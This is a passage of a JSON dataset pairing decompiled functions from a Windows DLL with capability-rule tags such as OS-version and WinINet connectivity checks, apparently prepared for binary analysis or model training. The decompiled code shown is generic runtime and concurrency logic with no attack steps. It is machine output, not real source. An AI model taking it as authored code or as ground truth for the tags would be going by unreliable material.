        "decompiled_code": "\nuint64_t fcn.180096358(int64_t arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    \n    if (arg4 == 0xfffffffe) {\n        arg4._0_4_ = *(arg3 + 0xd8);\n        piVar5 = arg4;\n    }\n    else {\n        if (arg4 == 0xffffffff) {\n            uVar8 = *(arg3 + 0xdc) - *(arg3 + 0xe8);\n            if (uVar8 <= *(arg3 + 0xb4)) {\n                uVar8 = *(arg3 + 0xb4);\n            }\n            arg4._0_4_ = (((*(arg3 + 0xd0) - *(arg3 + 0x9c)) - *(arg3 + 0xd8)) - (uVar8 + *(arg3 + 0xe8))) +\n                         *(arg3 + 0xd8);\n        }\n        piVar5 = NULL;\n    }\n    iVar7 = arg4 - piVar5;\n    if (arg4 != 0) {\n        iVar1 = *(arg2 + 0x28);\n        uVar10 = 0;\n        iVar2 = *(arg3 + 0x20);\n        if (*(arg1 + 0x1c) != 0) {\n            do {\n                iVar6 = *(iVar1 + uVar10 * 4) * 0x40 + iVar2;\n                piVar5 = *(iVar6 + 0x24);\n                if ((*(iVar6 + 0x24) != *(iVar6 + 0x2c)) && (uVar9 = 0,  *(iVar6 + 8) != 0)) {\n                    do {\n                        iVar3 = *(iVar6 + 0x38);\n                        if (((*(iVar3 + uVar9 * 0x48) == 4) && (*(iVar3 + 0x38 + uVar9 * 0x48) == 0)) &&\n                           ((*(iVar3 + 0x41 + uVar9 * 0x48) != '\\0' || (iVar7 != 0)))) {\n                            *(iVar3 + uVar9 * 0x48) = 5;\n                            *(arg3 + 0x9c) = *(arg3 + 0x9c) + 1;\n                            piVar5 = *(iVar3 + 0x20 + uVar9 * 0x48);\n                            *piVar5 = *piVar5 + -1;\n                            iVar4 = iVar7 + -1;\n                            if (*(iVar3 + 0x41 + uVar9 * 0x48) != '\\0') {\n                                iVar4 = iVar7;\n                            }\n                            iVar7 = iVar4;\n                            arg4._0_4_ = arg4 - 1;\n                            if (arg4 == 0) {\n                                return CONCAT71(piVar5 >> 8, 1);\n                            }\n                        }\n                        uVar8 = uVar9 + 1;\n                        uVar9 = uVar8;\n                    } while (uVar8 < *(iVar6 + 8));\n                }\n                uVar8 = uVar10 + 1;\n                uVar10 = uVar8;\n            } while (uVar8 < *(arg1 + 0x1c));\n        }\n    }\n    return piVar5 & 0xffffffffffffff00;\n}\n",
        "token_count": 816
    },
    "180098f0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_10h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n\nulong fcn.180098f0c(int64_t arg1, ulong arg2, uint32_t *arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    int32_t iVar6;\n    uint64_t arg4_00;\n    int64_t iVar7;\n    uint32_t uStack72;\n    uint32_t uStack68;\n    uchar auStack64 [16];\n    ulong var_bp_20h;\n    ulong var_bp_10h;\n    \n    arg4_00 = arg4;\n    if ((*arg3 & 0xfffffff) == 1) {\n        uVar1 = arg3[2];\n        uVar5 = 0;\n        iVar3 = *(arg1 + 0x28);\n        if (0 < *(arg1 + 0x44)) {\n            iVar7 = 0;\n            do {\n                if ((*(*(uVar1 * 0x20 + iVar3 + 8) + (uVar5 >> 5) * 4) >> (uVar5 & 0x1f) & 1) != 0) {\n                    uStack72 = *arg3;\n                    uStack68 = arg3[1];\n                    auStack64 = *(arg3 + 2);\n                    cVar2 = fcn.1800a50a4(*(iVar7 + *(arg1 + 0x30)), arg2, &uStack72, arg4_00);\n                    if (cVar2 != '\\0') {\n                        return 1;\n                    }\n                }\n                uVar4 = uVar5 + 1;\n                uVar5 = uVar4;\n                iVar7 = iVar7 + 8;\n            } while (uVar4 < *(arg1 + 0x44));\n        }\n    }\n    else if (((*arg3 & 0xfffffff) - 2 < 2) && (iVar3 = fcn.180098d94(arg1, arg3),  iVar3 != 0)) {\n        uStack72 = *arg3;\n        uStack68 = arg3[1];\n        auStack64 = *(arg3 + 2);\n        cVar2 = fcn.1800a50a4(iVar3, arg2, &uStack72, arg4_00);\n        if (cVar2 != '\\0') {\n            return 1;\n        }\n    }\n    iVar6 = 0;\n    if (0 < *(arg1 + 0x44)) {\n        iVar3 = 0;\n        do {\n            iVar7 = *(iVar3 + *(arg1 + 0x30));\n            if ((iVar7 != 0) && (0 < *(iVar7 + 0x30))) {\n                uStack72 = 0;\n                uStack68 = 0;\n                auStack64 = ZEXT816(0);\n                cVar2 = fcn.1800a50a4(iVar7, arg2, &uStack72, arg4_00);\n                if (cVar2 != '\\0') {\n                    return 1;\n                }\n            }\n            iVar6 = iVar6 + 1;\n            iVar3 = iVar3 + 8;\n        } while (iVar6 < *(arg1 + 0x44));\n    }\n    return 0;\n}\n",
        "token_count": 766
    },
    "18009cd7": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.18009cd78(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    ulong extraout_RAX;\n    int64_t *apiStackX24 [2];\n    code *pcStack136;\n    ulong uStack128;\n    int32_t iStack120;\n    ulong uStack112;\n    code **ppcStack104;\n    ulong uStack96;\n    uchar auStack88 [8];\n    uint uStack80;\n    ulong uStack72;\n    uchar auStack64 [56];\n    \n    uStack96 = 0xfffffffffffffffe;\n    if (arg2 == 0xffffffff) {\n        uStack80 = 0;\n        uStack72 = 0x1800923e0;\n        do {\n            if (*arg1 == 1) {\n                return 0;\n            }\n            cVar2 = fcn.1800913e8(auStack88);\n        } while (cVar2 != '\\0');\n        iStack120 = 0;\n        uStack128 = fcn.180092630();\n        pcStack136 = vtable.Concurrency::details::SingleWaitBlock.0;\n        ppcStack104 = &pcStack136;\n        fcn.180090e9c(auStack64, arg1 + 2);\n        iVar1 = *arg1;\n        if (iVar1 != 1) {\n            uStack112 = fcn.18009c7a4(*arg1);\n            *arg1 = &uStack112;\n        }\n        fcn.180090f10(auStack64);\n        if ((iVar1 != 1) && (iStack120 != 1)) {\n            LOCK();\n            iVar3 = iStack120;\n            if (iStack120 == 0) {\n                iStack120 = 2;\n                iVar3 = 0;\n            }\n            if (iVar3 != 1) {\n                fcn.1800925f0();\n            }\n        }\n    }\n    else {\n        if (arg2 != 0) {\n            apiStackX24[0] = arg1;\n            fcn.18009cfe0(apiStackX24, 1, CONCAT71(arg3 >> 8, 1), arg2);\n            return extraout_RAX;\n        }\n        if (*arg1 != 1) {\n            return 0xffffffffffffffff;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 533
    },
    "18009cfe": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.18009cfe0(int64_t *arg1, uint64_t arg2, uint64_t noname_2, ulong arg4)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    code *pcVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t iVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    ulong *puVar11;\n    int64_t iStackX8;\n    int64_t iStack200;\n    uint64_t uStack192;\n    int64_t iStack176;\n    int64_t iStack168;\n    int64_t iStack160;\n    uchar auStack144 [24];\n    ulong uStack120;\n    uchar auStack112 [56];\n    \n    uStack120 = 0xfffffffffffffffe;\n    if (arg1 == NULL) {\ncode_r0x00018009d30b:\n        fcn.18006dbd4(auStack144, \"pEvents\");\n        fcn.1800add8c(auStack144, 0x18011ee68);\n        pcVar3 = swi(3);\n        uVar9 = (*pcVar3)();\n        return uVar9;\n    }\n    if (arg2 == 0) {\n        uStack192 = 0;\n    }\n    else if ((arg2 == 1) && ((arg4 + 1 & 0xfffffffe) == 0)) {\n        if (*arg1 == 0) {\n            fcn.18006dbd4(auStack144, \"pEvents\");\n            fcn.1800add8c(auStack144, 0x18011ee68);\n            pcVar3 = swi(3);\n            uVar9 = (*pcVar3)();\n            return uVar9;\n        }\n        uStack192 = fcn.18009cd78(*arg1, arg4, noname_2);\n    }\n    else {\n        uVar9 = 0;\n        if (arg2 != 0) {\n            do {\n                if (arg1[uVar9] == 0) {\n                    fcn.18006dbd4(auStack144, \"pEvents\");\n                    fcn.1800add8c(auStack144, 0x18011ee68);\n                    pcVar3 = swi(3);\n                    uVar9 = (*pcVar3)();\n                    return uVar9;\n                }\n                uVar9 = uVar9 + 1;\n            } while (uVar9 < arg2);\n        }\n        fcn.18009bf60(&iStack200, arg2 & 0xffffffffffffff00 | noname_2 & 0xff, arg2);\n        bVar4 = false;\n        uVar9 = 0;\n        if (arg2 != 0) {\n            puVar11 = iStack176 + iStack200;\n            while( true ) {\n                piVar2 = arg1[uVar9];\n                fcn.180090e9c(auStack112, piVar2 + 2);\n                iStack160 = iStack160 + 1;\n                if (*piVar2 == 1) break;\n                uVar7 = fcn.18009c7a4(*piVar2);\n                *puVar11 = uVar7;\n                *piVar2 = puVar11;\ncode_r0x00018009d125:\n                fcn.180090f10(auStack112);\n                uVar9 = uVar9 + 1;\n                puVar11 = puVar11 + uStack192;\n                if (arg2 <= uVar9) goto code_r0x00018009d1ae;\n            }\n            if (noname_2 != '\\0') {\n                cVar5 = (**0x1800de8f0)();\n                if (cVar5 != '\\0') {\n                    uVar7 = fcn.18009c7a4(piVar2[1]);\n                    *puVar11 = uVar7;\n                    piVar2[1] = puVar11;\n                }\n                if (iStackX8 != 0) {\n                    bVar4 = true;\n                }\n                goto code_r0x00018009d125;\n            }\n            (**0x1800de8f0)(puVar11[1], &iStackX8, puVar11);\n            if (iStackX8 != 0) {\n                bVar4 = true;\n            }\n            uVar9 = uVar9 + 1;\n            if (uVar9 < arg2) {\n                puVar11 = iStack200 + 8 + uStack192 * uVar9 + iStack176;\n                iVar10 = arg2 - uVar9;\n                iVar8 = iStack160;\n                do {\n                    iVar8 = iVar8 + 1;\n                    iStack160 = iVar8;\n                    (**0x1800de8f0)(*puVar11, &iStackX8, puVar11 + -1);\n                    puVar11 = puVar11 + uStack192;\n                    iVar10 = iVar10 + -1;\n                } while (iVar10 != 0);\n            }\n            fcn.180090f10(auStack112);\ncode_r0x00018009d1ae:\n            if (!bVar4) goto code_r0x00018009d1b3;\n            goto code_r0x00018009d200;\n        }\ncode_r0x00018009d1b3:\n        if (*(iStack168 + 0x10) != 1) {\n            iVar6 = 0;\n            LOCK();\n            piVar1 = iStack168 + 0x10;\n            if (*piVar1 == 0) {\n                *piVar1 = 2;\n            }\n            else {\n                iVar6 = *piVar1;\n            }\n            if (iVar6 != 1) {\n                if (arg4 == 0) {\n                    LOCK();\n                    piVar1 = iStack168 + 0x28;\n                    iVar6 = *piVar1;\n                    *piVar1 = *piVar1 + 1;\n                    if (iVar6 == 0) {\n                        *(iStack168 + 0x18) = 0;\n                        *(iStack168 + 0x51) = 1;\n                    }\n                    else {\n                        fcn.1800925f0();\n                    }\n                }\n                else {\n                    if ((arg4 != 0xffffffff) && (*(iStack168 + 0x28) == 0)) {\n                        iVar6 = fcn.180094c38();\n                        if (iVar6 < 3) {\n                            uVar7 = fcn.18009c3b4();\n                            iVar6 = fcn.180091abc(iStack168 + 0x20, uVar7, 0x18009c32c, iStack168, arg4, 0, 0x20);\n                            if (iVar6 == 0) {\n                                fcn.18006db78(auStack144);\n                                fcn.1800add8c(auStack144, 0x18011ee08);\n                                pcVar3 = swi(3);\n                                uVar9 = (*pcVar3)();\n                                return uVar9;\n                            }\n                        }\n                        else {\n                            iVar8 = fcn.1800921ec(arg4, 0x18009c268, iStack168);\n                            *(iStack168 + 0x20) = iVar8;\n                            if (iVar8 == 0) {\n                                fcn.18006db78(auStack144);\n                                fcn.1800add8c(auStack144, 0x18011ee08);\n                                goto code_r0x00018009d30b;\n                            }\n                        }\n                        iStack160 = iStack160 + 1;\n                    }\n                    fcn.1800925f0();\n                }\n            }\n        }\ncode_r0x00018009d200:\n        if (*(iStack168 + 0x18) == 0) {\n            uStack192 = 0xffffffffffffffff;\n        }\n        else {\n            uStack192 = ((*(iStack168 + 0x18) - iStack176) - iStack200) / uStack192;\n        }\n        fcn.18009c0c0(&iStack200);\n    }\n    return uStack192;\n}\n",
        "token_count": 1820
    },
    "18009db2": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.18009db24(int64_t *arg1, int64_t *arg2)\n\n{\n    uint32_t *puVar1;\n    int64_t *piVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    ulong *arg3;\n    uint64_t uVar7;\n    \n    iVar4 = *arg1;\n    iVar5 = *(*(iVar4 + 0x18) + *(arg1 + 1) * 8);\n    if ((iVar5 == 1) || (piVar2 = *(*arg1 + 0x18) + *(arg1 + 1) * 8,  iVar6 = *piVar2,  *piVar2 = 1,  iVar6 != iVar5)) {\n        arg3 = *arg1;\n        LOCK();\n        puVar1 = arg3 + 0x24;\n        uVar3 = *puVar1;\n        uVar7 = uVar3;\n        *puVar1 = *puVar1 - 1;\n        if (uVar3 == 1) {\n            uVar7 = fcn.18009a214(arg3 + 6, 0x18009e65c, arg3, *arg3);\n        }\n        uVar7 = uVar7 & 0xffffffffffffff00;\n    }\n    else {\n        if (arg2 != NULL) {\n            *arg2 = iVar5;\n        }\n        uVar7 = CONCAT71(iVar4 >> 8, 1);\n    }\n    return uVar7;\n}\n",
        "token_count": 353
    },
    "18009f83": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18009f83c(int64_t arg1, int64_t arg2)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    int64_t arg1_00;\n    int32_t iVar3;\n    int64_t *piVar4;\n    code *pcVar5;\n    bool bVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int64_t *piVar9;\n    int64_t *arg1_01;\n    \n    uVar7 = fcn.180074ca4(arg1 + 0x18);\n    if (uVar7 == 0) {\n        bVar6 = true;\n        if (*(arg1 + 0x68) != NULL) {\n            piVar9 = NULL;\n            arg1_01 = *(arg1 + 0x68);\n            do {\n                piVar4 = arg1_01[1];\n                if (*arg1_01 == arg2) {\n                    if (piVar9 == NULL) {\n                        *(arg1 + 0x68) = piVar4;\n                    }\n                    else {\n                        piVar9[1] = piVar4;\n                    }\n                    if (arg1_01[1] == 0) {\n                        *(arg1 + 0x70) = piVar9;\n                    }\n                    fcn.18008fb24(arg1_01);\n                    break;\n                }\n                piVar9 = arg1_01;\n                arg1_01 = piVar4;\n            } while (piVar4 != NULL);\n            *(arg2 + 0x10) = 2;\n            LOCK();\n            piVar1 = arg2 + 8;\n            iVar3 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            bVar6 = false;\n            if (iVar3 == 1) {\n                (**0x1800de8f0)(arg2);\n            }\n        }\n        uVar7 = fcn.180074cc8(arg1 + 0x18);\n        if (uVar7 == 0) {\n            if (!bVar6) {\n                return;\n            }\n            LOCK();\n            puVar2 = arg2 + 0x10;\n            if (*puVar2 == 0) {\n                *puVar2 = 1;\n            }\n            else {\n                uVar7 = *puVar2;\n            }\n            if (uVar7 < 4) {\n                return;\n            }\n            uVar8 = fcn.1800d601c();\n            if (uVar7 == uVar8) {\n                return;\n            }\n            iVar3 = *(arg2 + 0x10);\n            *(arg2 + 0x10) = 2;\n            if (iVar3 == 3) {\n                return;\n            }\n            arg1_00 = arg2 + 0x60;\n            uVar7 = fcn.180074ca4(arg1_00);\n            if (uVar7 != 0) goto code_r0x00018009f994;\n            do {\n                if (*(arg2 + 0xb0) != '\\0') {\n                    uVar7 = fcn.180074cc8(arg1_00);\n                    if (uVar7 == 0) {\n                        return;\n                    }\n                    goto code_r0x00018009f99c;\n                }\n                uVar7 = fcn.1800d6c84(arg2 + 0x18, arg1_00);\n            } while (uVar7 == 0);\n            uVar7 = fcn.180074934(uVar7);\n            goto code_r0x00018009f984;\n        }\n    }\n    else {\ncode_r0x00018009f984:\n        uVar7 = fcn.180074934(uVar7);\n    }\n    uVar7 = fcn.180074934(uVar7);\ncode_r0x00018009f994:\n    uVar7 = fcn.180074934(uVar7);\ncode_r0x00018009f99c:\n    fcn.180074934(uVar7);\n    pcVar5 = swi(3);\n    (*pcVar5)();\n    return;\n}\n",
        "token_count": 913
    },
    "1800a433": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.1800a4334(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    uint64_t *puVar2;\n    int64_t *piVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    ulong *arg3;\n    uint32_t uVar7;\n    int64_t *piVar8;\n    uint64_t uVar9;\n    \n    iVar4 = *(arg1 + 4);\n    uVar7 = iVar4 - 1;\n    *(arg1 + 4) = uVar7;\n    puVar2 = *(arg1 + 0x10) + (*(arg1 + 8) & uVar7) * 8;\n    uVar9 = *puVar2;\n    *puVar2 = 0;\n    if (uVar9 == 0) {\n        *(arg1 + 4) = iVar4;\n    }\n    if ((uVar9 & 1) != 0) {\n        uVar9 = uVar9 & 0xfffffffffffffffe;\n        piVar8 = (*(arg1 + 8) & uVar7) * 0x10 + *(arg1 + 0x18);\n        iVar5 = *(*(*piVar8 + 0x18) + *(piVar8 + 1) * 8);\n        if ((iVar5 == 1) ||\n           (piVar3 = *(*piVar8 + 0x18) + *(piVar8 + 1) * 8,  iVar6 = *piVar3,  *piVar3 = 1,  iVar6 != iVar5)) {\n            arg3 = *piVar8;\n            LOCK();\n            piVar1 = arg3 + 0x24;\n            iVar4 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar4 == 1) {\n                fcn.18009a214(arg3 + 6, 0x18009e65c, arg3, *arg3);\n            }\n            uVar9 = 1;\n        }\n    }\n    return uVar9;\n}\n",
        "token_count": 473
    },
    "1800a51e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.1800a51e0(uint32_t *arg1)\n\n{\n    int32_t *piVar1;\n    uint64_t *puVar2;\n    int64_t *piVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    ulong *arg3;\n    int32_t iVar7;\n    char cVar8;\n    char in_DL;\n    uint64_t uVar9;\n    int64_t *piVar10;\n    bool bVar11;\n    \n    bVar11 = SBORROW4(*arg1, arg1[1]);\n    iVar7 = *arg1 - arg1[1];\n    while( true ) {\n        if (bVar11 == iVar7 < 0) {\n            return 0;\n        }\n        uVar4 = *arg1;\n        if ((((*(*(arg1 + 4) + (arg1[2] & uVar4) * 8) & 1) != 0) && (in_DL == '\\0')) &&\n           (cVar8 = fcn.1800a4ebc((arg1[2] & uVar4) * 0x10 + *(arg1 + 6)),  cVar8 != '\\0')) {\n            return 0;\n        }\n        puVar2 = *(arg1 + 4) + (arg1[2] & uVar4) * 8;\n        uVar9 = *puVar2;\n        *puVar2 = 0;\n        if ((uVar9 & 1) == 0) break;\n        uVar9 = uVar9 & 0xfffffffffffffffe;\n        piVar10 = (arg1[2] & uVar4) * 0x10 + *(arg1 + 6);\n        iVar5 = *(*(*piVar10 + 0x18) + *(piVar10 + 1) * 8);\n        if ((iVar5 != 1) &&\n           (piVar3 = *(*piVar10 + 0x18) + *(piVar10 + 1) * 8,  iVar6 = *piVar3,  *piVar3 = 1,  iVar6 == iVar5)) break;\n        arg3 = *piVar10;\n        LOCK();\n        piVar1 = arg3 + 0x24;\n        iVar7 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar7 == 1) {\n            fcn.18009a214(arg3 + 6, 0x18009e65c, arg3, *arg3);\n        }\n        *arg1 = uVar4 + 1;\n        bVar11 = SBORROW4(*arg1, arg1[1]);\n        iVar7 = *arg1 - arg1[1];\n    }\n    if (uVar9 != 0) {\n        *arg1 = uVar4 + 1;\n        return uVar9;\n    }\n    return 0;\n}\n",
        "token_count": 657
    },
    "1800a690": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.1800a6904(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    int64_t arg1_00;\n    bool bVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    uint8_t uVar7;\n    uint auStackX16 [2];\n    uint32_t uStack56;\n    uint uStack52;\n    ulong uStack48;\n    ulong uStack40;\n    \n    uVar2 = *(arg1 + 0x100);\n    uVar7 = 0;\n    iVar4 = arg2;\n    if (*(arg1 + 0x108) != 0) {\n        fcn.1800a65fc(arg1);\n        auStackX16[0] = *(*(arg1 + 0x108) + 0x130);\n        fcn.18000ed90(arg1 + 0x10);\n        (**0x1800de8f0)();\n        *(arg1 + 0x108) = 0;\n        if (iVar4 == 0) {\n            uVar1 = *(arg1 + 0x30);\n            uVar5 = (**0x1800de8f0)();\n            if ((*0x1801292e4 < 4) || ((*0x1801292e0 & 2) == 0)) {\n                bVar3 = false;\n            }\n            else {\n                bVar3 = true;\n            }\n            if (bVar3) {\n                fcn.18009e8a8(6, CONCAT71(arg2 >> 8, 4), uVar5, uVar1);\n            }\n            fcn.1800a8a8c(*(arg1 + 0x40), arg1);\n        }\n        else {\n            fcn.18000ed90(arg1 + 0x10);\n            *(arg1 + 0x60) = 1;\n        }\n        fcn.18009bbb0(*(arg1 + 0x48), auStackX16);\n        fcn.18009bce8(*(arg1 + 0x48));\n        uVar7 = *(arg1 + 0x124);\n        if (iVar4 == 0) {\n            *(arg1 + 0x60) = 1;\n        }\n    }\n    uVar6 = iVar4 - 2U;\n    if (iVar4 - 2U < 2) {\n        arg1_00 = *(arg1 + 0x40);\n        uStack56 = (uStack56 ^ (*(arg1_00 + 0x18) ^ uStack56) & 0xfffffff ^ *(arg1_00 + 0x18)) & 0xfffffff ^\n                   *(arg1_00 + 0x18);\n        uStack48 = *(arg1_00 + 0x20);\n        uStack52 = *(arg1_00 + 0x1c);\n        uStack40 = *(arg1_00 + 0x28);\n        uVar6 = fcn.1800a7f00(arg1_00, arg1, &uStack56);\n    }\n    if (iVar4 != 0) {\n        uVar6 = (**0x1800de8f0)(uVar2, 1);\n    }\n    return uVar6 & 0xffffffffffffff00 | uVar7;\n}\n",
        "token_count": 749
    },
    "1800a8f6": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.1800a8f6c(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    bool bVar3;\n    uint8_t uVar4;\n    char cVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint8_t in_DL;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int64_t iVar11;\n    int64_t *piVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uchar auStack184 [32];\n    char acStack152 [8];\n    int64_t iStack144;\n    int32_t aiStack136 [16];\n    uint64_t uStack72;\n    \n    uStack72 = *0x180123080 ^ auStack184;\n    iVar9 = *(arg1 + 0x110);\n    bVar3 = false;\n    if (0 < iVar9) {\n        iVar13 = 0;\n        acStack152[0] = '\\0';\n        iVar10 = 0;\n        iVar11 = 0;\n        do {\n            uVar8 = iVar10 >> (*(arg1 + 0xf4) & 0x1f);\n            uVar7 = uVar8;\n            if (uVar8 < *(arg1 + 0x10c)) {\n                iVar1 = *(arg1 + 0x108);\n                if (uVar8 < iVar1) {\n                    piVar12 = *(*(arg1 + 0x100) + uVar8 * 8);\n                }\n                else {\n                    uVar8 = uVar8 - iVar1;\n                    uVar7 = uVar8;\n                    piVar12 = *(*(arg1 + 0x100) + -8 + iVar1 * 8);\n                    if (-1 < uVar8) {\n                        uVar6 = uVar8 + 1;\n                        do {\n                            piVar12 = piVar12[1];\n                            uVar6 = uVar6 - 1;\n                        } while (uVar6 != 0);\n                    }\n                }\n                piVar2 = *(*piVar12 + (*(arg1 + 0xf0) - 1U & iVar10) * 8);\n                if (piVar2 != NULL) {\n                    if ((*piVar2 < piVar2[1]) || (piVar2[0x2c] < piVar2[0x2d])) {\n                        iStack144 = fcn.1800aa424(piVar2, uVar7 & 0xffffffffffffff00 | in_DL, acStack152);\n                        if (iStack144 != 0) goto code_r0x0001800a9290;\n                        if (acStack152[0] == '\\0') {\n                            if (iVar11 < 0xf) {\n                                iVar13 = iVar13 + 1;\n                                aiStack136[iVar11] = iVar10;\n                                iVar11 = iVar11 + 1;\n                                goto code_r0x0001800a90c1;\n                            }\n                            iStack144 = fcn.1800aa2e8(piVar2);\n                            if (iStack144 != 0) goto code_r0x0001800a9290;\n                        }\n                        if (((piVar2[0x24] == 1) && (piVar2[1] <= *piVar2)) && (piVar2[0x2d] <= piVar2[0x2c])) {\n                            bVar14 = true;\n                        }\n                        else {\n                            bVar14 = false;\n                        }\n                    }\n                    else {\n                        bVar14 = piVar2[0x24] == 1;\n                    }\n                    bVar3 = bVar3 | bVar14;\n                }\n            }\ncode_r0x0001800a90c1:\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < iVar9);\n        if (0 < iVar13) {\n            iVar11 = 0;\n            do {\n                iVar9 = aiStack136[iVar11] >> (*(arg1 + 0xf4) & 0x1f);\n                if (iVar9 < *(arg1 + 0x10c)) {\n                    iVar10 = *(arg1 + 0x108);\n                    if (iVar9 < iVar10) {\n                        piVar12 = *(*(arg1 + 0x100) + iVar9 * 8);\n                    }\n                    else {\n                        piVar12 = *(*(arg1 + 0x100) + -8 + iVar10 * 8);\n                        if (-1 < iVar9 - iVar10) {\n                            uVar7 = (iVar9 - iVar10) + 1;\n                            do {\n                                piVar12 = piVar12[1];\n                                uVar7 = uVar7 - 1;\n                            } while (uVar7 != 0);\n                        }\n                    }\n                    piVar2 = *(*piVar12 + (*(arg1 + 0xf0) - 1U & aiStack136[iVar11]) * 8);\n                    if (piVar2 != NULL) {\n                        if (((*piVar2 < piVar2[1]) || (piVar2[0x2c] < piVar2[0x2d])) &&\n                           (iStack144 = fcn.1800aa2e8(piVar2),  iStack144 != 0)) goto code_r0x0001800a9290;\n                        if (((piVar2[0x24] == 1) && (piVar2[1] <= *piVar2)) && (piVar2[0x2d] <= piVar2[0x2c])) {\n                            uVar4 = 1;\n                        }\n                        else {\n                            uVar4 = 0;\n                        }\n                        bVar3 = bVar3 | uVar4;\n                    }\n                }\n                iVar11 = iVar11 + 1;\n            } while (iVar11 < iVar13);\n        }\n    }\n    cVar5 = fcn.1800a8210(arg1 + 0x60, &iStack144);\n    if (cVar5 == '\\0') {\n        if (((0 < *(arg1 + 400)) && (bVar3)) && (iVar9 = 0,  0 < *(arg1 + 0x110))) {\n            do {\n                iVar10 = iVar9 >> (*(arg1 + 0xf4) & 0x1f);\n                if (iVar10 < *(arg1 + 0x10c)) {\n                    iVar13 = *(arg1 + 0x108);\n                    if (iVar10 < iVar13) {\n                        piVar12 = *(*(arg1 + 0x100) + iVar10 * 8);\n                    }\n                    else {\n                        piVar12 = *(*(arg1 + 0x100) + -8 + iVar13 * 8);\n                        if (-1 < iVar10 - iVar13) {\n                            uVar7 = (iVar10 - iVar13) + 1;\n                            do {\n                                piVar12 = piVar12[1];\n                                uVar7 = uVar7 - 1;\n                            } while (uVar7 != 0);\n                        }\n                    }\n                    iVar11 = *(*piVar12 + (*(arg1 + 0xf0) - 1U & iVar9) * 8);\n                    if (((iVar11 != 0) && (*(iVar11 + 0x90) == 1)) && (*(iVar11 + 0xb4) <= *(iVar11 + 0xb0))) {\n                        fcn.1800a8cf0(arg1, iVar11);\n                    }\n                }\n                iVar9 = iVar9 + 1;\n            } while (iVar9 < *(arg1 + 0x110));\n        }\n    }\n    else {\n        fcn.1800aa81c(iStack144);\n    }\ncode_r0x0001800a9290:\n    fcn.18008fb00(uStack72 ^ auStack184);\n    return;\n}\n",
        "token_count": 1732
    },
    "1800a7c0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
